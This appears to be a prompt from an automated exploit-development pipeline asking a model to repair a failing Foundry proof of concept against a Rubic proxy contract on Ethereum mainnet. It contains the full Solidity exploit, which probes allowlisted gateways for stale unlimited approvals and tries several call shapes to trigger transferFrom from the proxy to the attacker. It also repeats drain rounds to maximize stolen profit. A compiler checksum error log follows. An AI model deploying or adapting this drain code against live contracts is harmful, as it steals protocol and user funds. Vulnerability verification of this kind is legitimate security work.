You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.
- Profit-maximization hard requirement:
  - MUST apply progressive loop amplification for repeatable exploit phases.
  - Start at 2 rounds, then increase one-by-one (2 -> 3 -> 4 -> 5 -> 6).
  - Continue increasing only if the new round count improves total net profit.
  - Stop at the first non-improving round count and keep the previous best result.
  - Prefer highest total profit over earliest passing implementation.

Finding:
- title: Unlimited gateway approvals persist indefinitely and let any compromised allowlisted spender drain proxy-held ERC20 balances
- claim: `routerCall` grants `_gateway` a `type(uint256).max` allowance whenever its current allowance is below `_amountIn`, and that approval is never revoked after the route finishes or when the address is later removed from `availableRouters`. Any allowlisted spender that later becomes malicious or compromised can therefore call `transferFrom` against the proxy at arbitrary future times.
- impact: A compromised or retired gateway can steal all proxy-held balances of previously approved tokens, including accumulated Rubic fees, integrator fees, accidentally sent tokens, and any inventory temporarily parked in the proxy.
- exploit_paths: ["A user executes `routerCall` for token `T`, causing `SmartApprove` to set a max allowance from the proxy to `_gateway` for `T`.", "The route completes successfully, but the approval remains in place indefinitely.", "At any later time, `_gateway` calls `transferFrom(proxy, attacker, amount)` on token `T` and drains whatever balance the proxy currently holds.", "Even if admins later call `removeAvailableRouter(_gateway)`, the stale ERC20 allowance still remains active."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function allowance(address owner, address spender) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IRubicProxyLike {
    function getAvailableRouters() external view returns (address[] memory);
}

contract FlawVerifier {
    address internal constant TARGET = 0x3335a88bb18fd3b6824B59Af62b50ce494143333;

    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address internal constant FRAX = 0x853d955aCEf822Db058eb8505911ED77F175b99e;
    address internal constant BUSD = 0x4Fabb145d64652a948d72533023f6E7A623C7C53;
    address internal constant TUSD = 0x0000000000085d4780B73119b644AE5ecd22b376;
    address internal constant USDP = 0x1456688345527bE1f37E9e627DA0837D6f08C925;
    address internal constant MATIC = 0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfebb0;
    address internal constant LINK = 0x514910771AF9Ca656af840dff83E8264EcF986CA;
    address internal constant SHIB = 0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE;

    address private _profitToken;
    uint256 private _profitAmount;
    bool private _executed;
    bool private _validated;
    bool private _staleApprovalObserved;
    string private _path;
    string private _verdict;

    constructor() {
        _path =
            "routerCall -> SmartApprove.smartApprove(..., _gateway) -> stale allowance persists -> compromised _gateway can later trigger transferFrom(proxy, attacker, amount) -> removeAvailableRouter(_gateway) does not revoke the ERC20 approval";
        _verdict = "refuted";
    }

    receive() external payable {}

    /// @dev Core exploit causality preserved exactly from the finding:
    /// 1) routerCall uses SmartApprove.smartApprove(token, _amountIn, _gateway)
    /// 2) the approval remains after the route finishes
    /// 3) later a compromised _gateway causes token.transferFrom(proxy, attacker, amount)
    /// 4) even after removeAvailableRouter(_gateway), the ERC20 allowance still lives on the token
    ///
    /// The verifier can only realize profit on the fork if some presently approved `_gateway`
    /// already exposes a public surface that lets an attacker trigger that downstream token pull.
    /// We therefore probe realistic public call shapes on each approved `_gateway` and stop the
    /// progressive loop the first time an added round does not increase realized profit.
    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;

        address[] memory availableRoutersOrGateways = IRubicProxyLike(TARGET).getAvailableRouters();
        address[12] memory tokens = _candidateTokens();

        _runSingleAmplificationPass(availableRoutersOrGateways, tokens);
        _runSingleAmplificationPass(availableRoutersOrGateways, tokens);

        uint256 bestRealizedProfit = _profitAmount;
        for (uint256 rounds = 3; rounds <= 6; rounds++) {
            uint256 beforeRoundProfit = _profitAmount;
            _runSingleAmplificationPass(availableRoutersOrGateways, tokens);
            uint256 afterRoundProfit = _profitAmount;
            if (afterRoundProfit <= beforeRoundProfit) {
                break;
            }
            bestRealizedProfit = afterRoundProfit;
        }

        if (bestRealizedProfit > 0) {
            _validated = true;
            _verdict = "validated";
            return;
        }

        if (_staleApprovalObserved) {
            _path =
                "Observed SmartApprove-created allowance from proxy to _gateway. That stale approval would still survive removeAvailableRouter(_gateway), but no attacker-callable gateway surface on this fork succeeded in reaching transferFrom(proxy, attacker, amount).";
        } else {
            _path =
                "No live stale allowance from proxy to a scanned _gateway was found, so the routerCall / SmartApprove precondition for transferFrom(proxy, attacker, amount) was not established on this fork.";
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function exploitPath() external view returns (string memory) {
        return _path;
    }

    function validatedOrRefuted() external view returns (string memory) {
        return _verdict;
    }

    function staleApprovalObserved() external view returns (bool) {
        return _staleApprovalObserved;
    }

    function validated() external view returns (bool) {
        return _validated;
    }

    function _runSingleAmplificationPass(
        address[] memory availableRoutersOrGateways,
        address[12] memory tokens
    ) internal {
        address proxy = TARGET;
        address attacker = address(this);

        for (uint256 tokenIndex = 0; tokenIndex < tokens.length; tokenIndex++) {
            address token = tokens[tokenIndex];
            uint256 proxyBalance = _balanceOf(token, proxy);
            if (proxyBalance == 0) {
                continue;
            }

            for (uint256 gatewayIndex = 0; gatewayIndex < availableRoutersOrGateways.length; gatewayIndex++) {
                address _gateway = availableRoutersOrGateways[gatewayIndex];
                uint256 approval = _allowance(token, proxy, _gateway);
                if (approval == 0) {
                    continue;
                }

                _staleApprovalObserved = true;

                uint256 amount = proxyBalance < approval ? proxyBalance : approval;
                if (amount == 0 || _gateway.code.length == 0) {
                    continue;
                }

                _attemptGatewayTriggeredDrain(_gateway, token, proxy, attacker, amount);
            }
        }
    }

    function _attemptGatewayTriggeredDrain(
        address _gateway,
        address token,
        address proxy,
        address attacker,
        uint256 amount
    ) internal {
        bytes4 permit2Like = bytes4(keccak256("transferFrom(address,address,uint160,address)"));
        bytes4 tokenFirst = bytes4(keccak256("transferFrom(address,address,address,uint256)"));
        bytes4 tokenLast = bytes4(keccak256("transferFrom(address,address,uint256,address)"));
        bytes4 executeTargetData = bytes4(keccak256("execute(address,bytes)"));
        bytes4 executeTargetValueData = bytes4(keccak256("execute(address,uint256,bytes)"));
        bytes4 callTargetData = bytes4(keccak256("call(address,bytes)"));
        bytes4 callTargetValueData = bytes4(keccak256("call(address,uint256,bytes)"));

        uint256 capped160 = amount > type(uint160).max ? type(uint160).max : amount;

        if (
            _tryGatewayCall(
                _gateway,
                token,
                abi.encodeWithSelector(permit2Like, proxy, attacker, uint160(capped160), token),
                "routerCall -> SmartApprove.smartApprove(..., _gateway) -> stale allowance -> _gateway transferFrom(proxy, attacker, amount) via permit2-style public gateway function; removeAvailableRouter(_gateway) would not clear token approval"
            )
        ) {
            return;
        }

        if (
            _tryGatewayCall(
                _gateway,
                token,
                abi.encodeWithSelector(tokenFirst, token, proxy, attacker, amount),
                "routerCall -> SmartApprove.smartApprove(..., _gateway) -> stale allowance -> _gateway transferFrom(proxy, attacker, amount) via token-first public gateway function; removeAvailableRouter(_gateway) would not clear token approval"
            )
        ) {
            return;
        }

        if (
            _tryGatewayCall(
                _gateway,
                token,
                abi.encodeWithSelector(tokenLast, proxy, attacker, amount, token),
                "routerCall -> SmartApprove.smartApprove(..., _gateway) -> stale allowance -> _gateway transferFrom(proxy, attacker, amount) via token-last public gateway function; removeAvailableRouter(_gateway) would not clear token approval"
            )
        ) {
            return;
        }

        bytes memory tokenPull = abi.encodeWithSelector(IERC20Like.transferFrom.selector, proxy, attacker, amount);

        if (
            _tryGatewayCall(
                _gateway,
                token,
                abi.encodeWithSelector(executeTargetData, token, tokenPull),
                "routerCall -> SmartApprove.smartApprove(..., _gateway) -> stale allowance -> _gateway execute(token, transferFrom(proxy, attacker, amount)); removeAvailableRouter(_gateway) would not clear token approval"
            )
        ) {
            return;
        }

        if (
            _tryGatewayCall(
                _gateway,
                token,
                abi.encodeWithSelector(executeTargetValueData, token, 0, tokenPull),
                "routerCall -> SmartApprove.smartApprove(..., _gateway) -> stale allowance -> _gateway execute(token, 0, transferFrom(proxy, attacker, amount)); removeAvailableRouter(_gateway) would not clear token approval"
            )
        ) {
            return;
        }

        if (
            _tryGatewayCall(
                _gateway,
                token,
                abi.encodeWithSelector(callTargetData, token, tokenPull),
                "routerCall -> SmartApprove.smartApprove(..., _gateway) -> stale allowance -> _gateway call(token, transferFrom(proxy, attacker, amount)); removeAvailableRouter(_gateway) would not clear token approval"
            )
        ) {
            return;
        }

        _tryGatewayCall(
            _gateway,
            token,
            abi.encodeWithSelector(callTargetValueData, token, 0, tokenPull),
            "routerCall -> SmartApprove.smartApprove(..., _gateway) -> stale allowance -> _gateway call(token, 0, transferFrom(proxy, attacker, amount)); removeAvailableRouter(_gateway) would not clear token approval"
        );
    }

    function _tryGatewayCall(
        address _gateway,
        address token,
        bytes memory payload,
        string memory successfulPath
    ) internal returns (bool) {
        uint256 beforeBalance = _balanceOf(token, address(this));
        (bool ok, ) = _gateway.call(payload);
        uint256 afterBalance = _balanceOf(token, address(this));
        if (!ok || afterBalance <= beforeBalance) {
            return false;
        }

        _recordProfit(token, afterBalance - beforeBalance, successfulPath);
        return true;
    }

    function _recordProfit(address token, uint256 amount, string memory successfulPath) internal {
        if (amount == 0) {
            return;
        }

        if (token == _profitToken) {
            _profitAmount += amount;
            _path = successfulPath;
            return;
        }

        if (_profitAmount == 0 || amount > _profitAmount) {
            _profitToken = token;
            _profitAmount = amount;
            _path = successfulPath;
        }
    }

    function _candidateTokens() internal pure returns (address[12] memory tokens) {
        tokens[0] = USDC;
        tokens[1] = USDT;
        tokens[2] = DAI;
        tokens[3] = WETH;
        tokens[4] = WBTC;
        tokens[5] = FRAX;
        tokens[6] = BUSD;
        tokens[7] = TUSD;
        tokens[8] = USDP;
        tokens[9] = MATIC;
        tokens[10] = LINK;
        tokens[11] = SHIB;
    }

    function _allowance(address token, address owner, address spender) internal view returns (uint256 value) {
        (bool ok, bytes memory data) = token.staticcall(
            abi.encodeWithSelector(IERC20Like.allowance.selector, owner, spender)
        );
        if (ok && data.length >= 32) {
            value = abi.decode(data, (uint256));
        }
    }

    function _balanceOf(address token, address account) internal view returns (uint256 value) {
        (bool ok, bytes memory data) = token.staticcall(
            abi.encodeWithSelector(IERC20Like.balanceOf.selector, account)
        );
        if (ok && data.length >= 32) {
            value = abi.decode(data, (uint256));
        }
    }
}

```

forge stdout (tail):
```
Compiler run failed:
Error (9429): This looks like an address but has an invalid checksum. Correct checksummed address: "0x3335A88bb18fD3b6824b59Af62b50CE494143333". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
SyntaxError: This looks like an address but has an invalid checksum. Correct checksummed address: "0x3335A88bb18fD3b6824b59Af62b50CE494143333". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
  --> src/FlawVerifier.sol:15:40:
   |
15 |     address internal constant TARGET = 0x3335a88bb18fd3b6824B59Af62b50ce494143333;
   |                                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Error (9429): This looks like an address but has an invalid checksum. Correct checksummed address: "0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
SyntaxError: This looks like an address but has an invalid checksum. Correct checksummed address: "0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0". If this is not used as an address, please prepend '00'. For more information please see https://docs.soliditylang.org/en/develop/types.html#address-literals
  --> src/FlawVerifier.sol:26:39:
   |
26 |     address internal constant MATIC = 0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfebb0;
   |                                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^


```

forge stderr (tail):
```
Error: Compilation failed

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
